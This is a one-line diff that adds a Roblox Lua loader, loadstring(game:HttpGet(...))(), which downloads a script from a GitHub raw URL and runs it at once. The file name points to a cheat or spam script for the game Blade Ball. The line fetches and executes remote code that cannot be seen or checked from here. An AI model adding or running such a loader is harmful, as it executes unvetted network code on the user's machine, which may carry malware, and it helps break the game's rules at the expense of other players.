@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/blade-ball-spam7-vvjf5wbvo0p63s.lua"))()
